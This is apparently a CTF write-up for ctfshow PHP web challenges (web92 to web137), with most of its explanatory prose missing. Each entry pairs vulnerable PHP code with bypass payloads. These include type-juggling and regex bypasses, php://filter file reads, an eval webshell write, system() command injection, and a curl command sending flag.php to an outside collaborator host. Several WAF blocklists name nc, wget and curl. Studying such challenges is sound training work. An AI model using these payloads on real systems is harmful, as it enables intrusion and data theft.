$a))`php\n\n`(preg_match('/^php$/i', $a))`php\n\n\n\n> preg_match()  preg_match_all() subject \n\n\n\n`%0a`enter\n\n**payload**\n\n```\n?cmd=%0aphp\n?cmd=php%0a1   (php%0a)\n```\n\n `%0aphp`payload `php%0a1`\n\n`^php$``(preg_match('/^php$/i', $a))`\n\n\n\n### web92\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n\n\n> intval()$base0$var ePHP\n\ne0b0x\n\n**payload**\n\n```\n?num=0b1000101111100\n?num=0x117c\n?num=4476e123\n```\n\n\n\n### web93\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)==4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    } \n```\n\ne\n\n0\n\n```\n?num=010574\n```\n\n\n\n### web94\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]/i\", $num)){\n        die(\"no no no!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n0,if`===`\n\n `4476.0` \n\n```\n?num=4476.0\n```\n\n\n\n```\n?num=+010574\n?num= 010574//\n```\n\n\n\n### web95\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num==4476){\n        die(\"no no no!\");\n    }\n    if(preg_match(\"/[a-z]|\\./i\", $num)){\n        die(\"no no no!!\");\n    }\n    if(!strpos($num, \"0\")){\n        die(\"no no no!!!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }\n}\n```\n\n  `+` \n\n```\n?num= 010574\n?num=+010574\n```\n\n\n\n### web96\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_GET['u'])){\n    if($_GET['u']=='flag.php'){\n        die(\"no no no\");\n    }else{\n        highlight_file($_GET['u']);\n    }\n\n\n} \n```\n\nflag.php\n\n```\n?u=./flag.php\n```\n\n\n\n```\n?u=php://filter/resource=flag.php\n```\n\n\n\n### web97\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif (isset($_POST['a']) and isset($_POST['b'])) {\nif ($_POST['a'] != $_POST['b'])\nif (md5($_POST['a']) === md5($_POST['b']))\necho $flag;\nelse\nprint 'Wrong.';\n}\n?> \n```\n\npostaba!=b\n\n`md5($_POST['a']) === md5($_POST['b'])`\n\n> MD5NULL\n\n```\na[]=1&b[]=2\n```\n\n\n\n### web98\n\n```\ninclude(\"flag.php\");\n$_GET?$_GET=&$_POST:'flag';\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n\n?> \n```\n\n```\n`$_GET?$_GET=&$_POST:'flag';` \n```\n\n\n\nGETpostgetflag\n\n```\n$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';\n```\n\nflag='flag',COOKIEget,'flag'\n\n```\n$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; \n```\n\nflag='flag',SERVERget,'flag'\n\n```\n$_GET['HTTP_FLAG']=='flag'?$flag:__FILE__\n```\n\nHTTP_FLAG=flag'$flag\n\n\n\nget\n\n```\n?HTTP_FLAG=flag\n```\n\nGETpostget\n\ngetpost\n\n```\n?num=1111\n\npost:HTTP_FLAG=flag\n```\n\nhighlight_file($flag)$flagphp$flag\n\n\n\n### web99\n\n```\nhighlight_file(__FILE__);\n$allow = array();\nfor ($i=36; $i < 0x36d; $i++) { \n    array_push($allow, rand(1,$i));\n}\nif(isset($_GET['n']) && in_array($_GET['n'], $allow)){\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n\n?> \n```\n\n`array_push`\n\n> array_push  \n\n`in_array`\n\n> i\n\nncontentn\n\n1\n\n 1.php `1.php == 1`\n\ncontent\n\n```\n?n=1.php\n\nPOST:content=<?php @eval($_POST[1]);?>\n```\n\n\n\n\n\n### web100\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\;/\", $v2)){\n        if(preg_match(\"/\\;/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n`is_numeric`\n\n>  \n\n\n\n\n\n```\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\n```\n\n\n\n```\n&& --> || --> = --> and --> or\n```\n\nand\n\n```\n$v0=is_numeric($v1)\n```\n\nv1v2,v3\n\n\n\n```\neval(\"$v2('ctfshow')$v3\");\n```\n\n  `flag in class ctfshow; `\n\n`||`\n\n```\n?v1=1&v2=system(\"cat ctfshow.php\")||&v3=;\n```\n\n\n\n### web101\n\n```\nhighlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){\n        if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n    \n} \n```\n\n\n\n\n\n```\neval(\"$v2('ctfshow')$v3\"); \n```\n\nwp\n\n`ReflectionClasss`\n\n> ReflectionClass\n>\n> ReflectionClassPHP5Reflector\n> PHPnew ReflectionClass(system('cmd'))\n\n\n\n**payload**\n\n```\n?v1=1&v2=echo new ReflectionClass&v3=;\n```\n\n 0x2d -  35\n\n\n\n### web102\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    file_put_contents($v3,$str);\n}\nelse{\n    die('hacker');\n}\n\n\n?>\n```\n\n`substr`\n\n> **substr** ( string `$string` , int `$start` [, int `$length` ] ) : string\n>\n>  `string`  `start`  `length` \n\n `$s = substr($v2,2);`v2[2:],\n\n`call_user_func`\n\n> **call_user_func** ( [callable](php/language.types.callable.html) `$callback` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](php/language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](php/language.pseudo-types.html#language.types.mixed)\n>\n>  `callback` \n\nv1v3v2shell\n\nwp\n\n```\n<?=`tac *`;  \n```\n\nhex3c3f3d60746163202a603b \nbase64\n\n```\nPD89YHRhYyAqYDs= //hex\n```\n\n```\n5044383959485268597941715944733d\n```\n\n `3d`\n\nv1=hex2bin  v2=00504438395948526859794171594473  v3=php://1.php\n\n**payload**\n\n```\nPOST:v1=hex2bin\n\n?v2=00504438395948526859794171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n\n\n\n\n### web103\n\n```\nhighlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\n        file_put_contents($v3,$str);\n    }\n    else{\n        die('Sorry');\n    }\n}\nelse{\n    die('hacker');\n} \n```\n\n\n\n```\n<?=`cat *`;\n```\n\nbase64\n\n```\nPD89YGNhdCAqYDs\n```\n\nascii\n\n```\n5044383959474e6864434171594473\n```\n\ne\n\npayload\n\n```\n?v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php\n```\n\n\n\n### web104\n\n```\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2)){\n        echo $flag;\n    }\n} \n```\n\nsha(a[])null  null==null\n\n\n\n### web105\n\n```\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error='flag';\n$suces='';\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key => $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\necho \"your are good\".$flag.\"\\n\";\ndie($suces); \n```\n\n\n\n```\nforeach($_GET as $key => $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value; \n```\n\nGETKEYVALUE\n\n `$$key=$$value;` keyerror\n\n `suces=flag`\n\n `$suces=$flag`flagsucesseceserror\n\npost `error=suces`\n\n```\n$errot=$suces=$flag\n```\n\n\n\n```\nif(!($_POST['flag']==$flag)){\n    die($error); \n```\n\nerrorerrorflag\n\n**payload**\n\n```\n?suces=flag\n\nPOST:error=suces\n```\n\n\n\n### web106\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) && isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2) && $v1!=$v2){\n        echo $flag;\n    }\n} \n```\n\n\n\n\n\n### web107\n\n```\ninclude(\"flag.php\");\n\nif(isset($_POST['v1'])){\n    $v1 = $_POST['v1'];\n    $v3 = $_GET['v3'];\n       parse_str($v1,$v2);\n       if($v2['flag']==md5($v3)){\n           echo $flag;\n       }\n\n} \n```\n\n`parse_str`\n\n> **parse_str** ( string `$encoded_string` [, array `&$result` ] ) : void\n>\n>  `encoded_string`  URL query string `result`  \n\nv3=flag\n\n`v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc`flagmd5\n\n**payload**\n\n```\n?v3=flag\nPOST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc\n```\n\n md5nullv2flagnullnull==null\n\n```\n?v3[]=\nPOST:V1=\n```\n\n\n\n### web108\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE)  {\n    die('error');\n\n}\n//36dflag\nif(intval(strrev($_GET['c']))==0x36d){\n    echo $flag;\n}\n```\n\n\n\nereg%00\n\npayload\n\n```\n?c=a%00778\n```\n\n\n\n### web109\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n\n} \n```\n\nv1v2evalweb101\n$v1v1$v2()\n\n__toString()phpReflectionclassExceptionError\n`__toString()`\n\n> PHP5.2.0__toString()  echo  print PHP5.2.0\n\necho`$v1``__toString()`v2\n\n**payload**\n\n```\n?v1=CachingIterator&v2=system(ls)\n?v1=Exception&v2=system('cat fl36dg.txt') \n```\n\n\n\n### web110\n\n```\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n\n    eval(\"echo new $v1($v2());\");\n\n} \n```\n\nFilesystemIteratorFilesystemIteratorgetcwd()\n\n**payload**\n\n```\n?v1=FilesystemIterator&v2=getcwd\n```\n\nfl36dga.txt\n\nurl/fl36dga.txtflag\n\n`FilesystemIterator`\n\n\n\n\n\n> FilesystemIteratorgetcwd()\n\n```\n<?php\n\terror_reporting(0);\n\techo getcwd().PHP_EOL;\n\techo new FilesystemIterator('./').PHP_EOL;\n\techo new FilesystemIterator(getcwd());\n?>\n\nD:\\PHP\n  index.php\n  index.php\n```\n\n\n\n### web111\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nfunction getFlag(&$v1,&$v2){\n    eval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n}\n\n\nif(isset($_GET['v1']) && isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\<|\\>/', $v2)){\n            die(\"error v2\");\n    }\n    \n    if(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    }\n     \n```\n\nv1ctfshowgetFlag\n\n```\neval(\"$$v1 = &$$v2;\");\n    var_dump($$v1);\n```\n\n$ctfshow=$$v2,$$v1\n\n`v2=GLOBALS`\n\n```\nvar_dump($GLOBALS);\n```\n\npayload\n\n```\n?v1=ctfshow&v2=GLOBALS\n```\n\n\n\n### web112\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){\n        die(\"hacker!\");\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`is_file`\n\n> \n\nis_filephp\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web113\n\n```\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n\n```\n\nfilter\n\n**linux`/proc/self/root`**\n\n`ls /proc/self/root`\n\n`is_file`\n\npayload\n\n```\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\n\n\n```\ncompress.zlib://flag.php\n```\n\nflag.php\n\n\n\n### web114\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file){\n    if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\necho \"tql \";\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`compress``root`ban\n\n\n\n`filter`ban\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web115\n\n```\ninclude('flag.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($num){\n    $num=str_replace(\"0x\",\"1\",$num);\n    $num=str_replace(\"0\",\"1\",$num);\n    $num=str_replace(\".\",\"1\",$num);\n    $num=str_replace(\"e\",\"1\",$num);\n    $num=str_replace(\"+\",\"1\",$num);\n    return $num;\n}\n$num=$_GET['num'];\nif(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){\n    if($num=='36'){\n        echo $flag;\n    }else{\n        echo \"hacker!!\";\n    }\n}else{\n    echo \"hacker!!!\"; \n```\n\n`trim`\n\n>  \n>\n>  **trim()** \n>\n>  - \" \" (ASCII *32* (*0x20*))\n>  - \"\\t\" (ASCII *9* (*0x09*))\n>  - \"\\n\" (ASCII *10* (*0x0A*))\n>  - \"\\r\" (ASCII *13* (*0x0D*))\n>  - \"\\0\" (ASCII *0* (*0x00*))\n>  - \"\\x0B\" (ASCII *11* (*0x0B*))\n\n\n\n```\n <?php\nfor($i=1;$i<=128;$i++){\n    $a=chr($i).'1';\n    if(trim($a)!=='1'&&is_numeric($a)){\n        echo urlencode(chr($i));\n        echo \"\\n\";\n    }\n    \n}\n```\n\n %0c()\n\npayload\n\n```\n?num=%0c36\n```\n\n\n\n### web123\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&&$c<=18){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n```\n\n\n\n> phppostget+[[such as`CTF[SHOW.COM`=>`CTF_SHOW.COM`\n\n`POST`  `CTF_SHOW.COM``CTF_SHOW_COM`\n\npayload\n\n```\nPOST: CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag\n```\n\n\n\n### web125\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&&$c<=16){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\necho\n\n\n\n```\n$a=$_SERVER['argv'];\n```\n\n> $_SERVER['argv']\n>\n> 1cli\n>\n> \t$_SERVER['argv'][0]\n>\n> 2web\n>\n> \twebphp.iniregister_argc_argv\n> \t\t\n> \tregister_argc_argv = On(Off)$_SERVER[argv]\n> \t\t\n> \t$_SERVER[argv][0] = $_SERVER[QUERY_STRING]\n> \t\t\n> \t$argv,$argcweb\n\n```\n\n$_SERVER[argv][0] = $_SERVER[QUERY_STRING]\n $_SERVER[QUERY_STRING] ?\n```\n\npayload\n\n```\n?$fl0g=flag_give_me;\n\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=eval($a[0])\n```\n\n\n\n`highlight_file()`\n\n```\nfun=highlight_file($_GET[1])\n```\n\npayload\n\n```\n?1=flag.php\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=highlight_file($_GET[1])\n```\n\n\n\n### web126\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) && strlen($c)<=16){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\npayload\n\n```\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n```\n\n(url)`$a[1]``fl0g=flag_give_me`\n\n```\nget: a=1+2+fl0g=flag_give_me//url\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[2])\n```\n\n```\n<?php\n$a=$_SERVER['argv'];\nvar_dump($a);\n\n a=1+fl0g=flag_give_me\n\narray(2) { [0]=> string(3) \"a=1\" [1]=> string(17) \"fl0g=flag_give_me\" }\n\n```\n\n\n\n### web127\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n$ctf_show = md5($flag);\n$url = $_SERVER['QUERY_STRING'];\n\n\n//\nfunction waf($url){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $url)){\n        return true;\n    }else{\n        return false;\n    }\n}\n\nif(waf($url)){\n    die(\"\");\n}else{\n    extract($_GET);\n}\n\n\nif($ctf_show==='ilove36d'){\n    echo $flag;\n}\n```\n\n> `$_SERVER['QUERY_STRING'];`urlurl\n\n\n\n```\n<?php\nfunction waf($num){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $num)){\n        return false;\n    }else{\n        return true;\n    }\n}\nfor($i = 0; $i<129; $i++){\n\t$num=chr($i);\n\tif(waf($num)){\n\t\techo \"\".$num.\"   \".urlencode(chr($i)).\"\\n\";\n\t}\n}\n?>\n```\n\n%20\n\n**payload**\n\n```\n?ctf show=ilove36d\n```\n\n\n\n### web128\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n$f1 = $_GET['f1'];\n$f2 = $_GET['f2'];\n\nif(check($f1)){\n    var_dump(call_user_func(call_user_func($f1,$f2)));\n}else{\n    echo \"\";\n}\n\n\n\nfunction check($str){\n    return !preg_match('/[0-9]|[a-z]/i', $str);\n}\n```\n\nwp\n\ngettext\n\n _()  gettext()\n\n```\n<?php\necho gettext(\"phpinfo\");\n  phpinfo\n\necho _(\"phpinfo\");\n phpinfo\n```\n\n `call_user_func('_','phpinfo')` phpinfo\n\nflagflag.phpget_defined_vars\n\n```\nget_defined_vars ( void ) : array\n\n```\n\n**payload**\n\n```\n?f1=_&f2=get_defined_vars\n```\n\n\n\n### web129\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['f'])){\n    $f = $_GET['f'];\n    if(stripos($f, 'ctfshow')>0){\n        echo readfile($f);\n    }\n}\n```\n\n\n\n`../`   \n\n`./`    \n\n**payload**\n\n```\n?f=../../ctfshow../../../var/www/html/flag.php\n```\n\n\n\n### web130\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = $_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f, 'ctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\n> preg_matchfalse10\n>\n> if(0 === flase)false0false\n>\n> stripos()nullnull!==flase\n\n/s.+?+?1ctfshowf=ctfshow\n\n**payload**\n\n```\n?f=ctfshow[]\n?f[]=1\n?f=ctfshow  (ctfshow)\n```\n\npPCRE\n\n> https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\n\n\n\nPHPreDOSpcre`pcre.backtrack_limit``var_dump(ini_get('pcre.backtrack_limit'));`\n\nPHP\n\n\n\n```\nimport requests\nurl=\"http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/\"\ndata={\n    'f':'very'*250000+'ctfshow'\n}\nr=requests.post(url,data=data)\nprint(r.text)\n\n```\n\n\n\n### web131\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = (String)$_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f,'36Dctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\nPCRE\n\n\n\n### web132\n\n/admin\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n\nif(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n\n    if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\"){\n        \n        if($code == 'admin'){\n            echo $flag;\n        }\n        \n    }\n} \n```\n\n\n\n```\nif($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\")\n```\n\n```\n<?php\nif(false && false || true){\n\techo \"true!\";\n}else{\n    echo \"false!\";\n}\n?>\n\n//true\n```\n\n**payload**\n\n```\n?code=admin&password=admin&username=admin\n```\n\n\n\n### web133\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"6?!\");\n    }\n}\n```\n\n```\nget   F=`$F `;sleep 3\nsubstr($F,0,6)   `$F `;\n eval(\"`$F `;\");\n$F\neval(\"``$F `;sleep 3`\");\n  `   `$F `;sleep 3  ` == shell_exec(\"`$F `;sleep 3\");\n\n sleep 3\n RCE\n```\n\nshell curl \n \n\n```\ncurl  http://xxx:4567?p=`tac f*`\n```\n\nipbp\n\n**payload**\n\n```\n/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;\n```\n\n\n\n### web134\n\n```\n$key1 = 0;\n$key2 = 0;\nif(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {\n    die(\"nonononono\");\n}\n@parse_str($_SERVER['QUERY_STRING']);\nextract($_POST);\nif($key1 == '36d' && $key2 == '36d') {\n    die(file_get_contents('flag.php'));\n}\n```\n\n`extract`\n\n\n\n```\nparse_str($_SERVER['QUERY_STRING']);\nvar_dump($_POST);\n// _POST[a]=123\narray(1) { [\"a\"]=> string(3) 123 }\n$_POST[a]123\n```\n\n**payload**\n\n```\n?_POST[key1]=36d&_POST[key2]=36d\n```\n\n\n\n### web135\n\n```\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"\");\n    }\n}\n```\n\n**payload**\n\n```\n?F=`$F` ;cp flag.php 2.txt;\n?F=`$F` ;uniq flag.php>4.txt;\n```\n\n\n\n### web136\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\nlinuxtee\n\n**payload**\n\n```\nls|tee 1.txt\nls / |tee 1.txt\ncat /f* |1.txt\n```\n\n\n\n### web137\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\n\n\ncall_user_func($_POST['ctfshow']); \n```\n\nctfshowgetFlag\n\n```\nPOST:ctfshow=ctfshow::getFlag\n```\n\nyu22x\n\n> php ->:: \n> ->\n> 